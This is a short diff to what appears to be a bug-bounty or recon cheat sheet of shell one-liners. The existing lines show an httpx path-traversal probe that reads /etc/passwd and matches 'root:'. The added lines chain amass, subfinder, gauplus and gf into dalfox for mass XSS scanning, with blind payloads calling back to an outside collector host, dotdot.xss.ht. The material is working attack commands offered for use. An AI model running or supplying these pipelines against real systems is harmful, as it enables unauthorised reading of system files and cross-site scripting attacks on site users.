@@ -25,3 +25,7 @@ nuclei -l ips_ports.txt -t nuclei-templates/
 ```bash
 httpx -l url.txt -path "///////../../../../../../etc/passwd" -status-code -mc 200 -ms 'root:'
 ```
+
+ ```bash
+xargs -a cidr.txt -I@ bash -c 'amass intel -active -cidr @' | subfinder -all -silent | gauplus -subs | gf xss | uro | dalfox pipe --deep-domxss --multicast --blind dotdot.xss.ht
+ ```
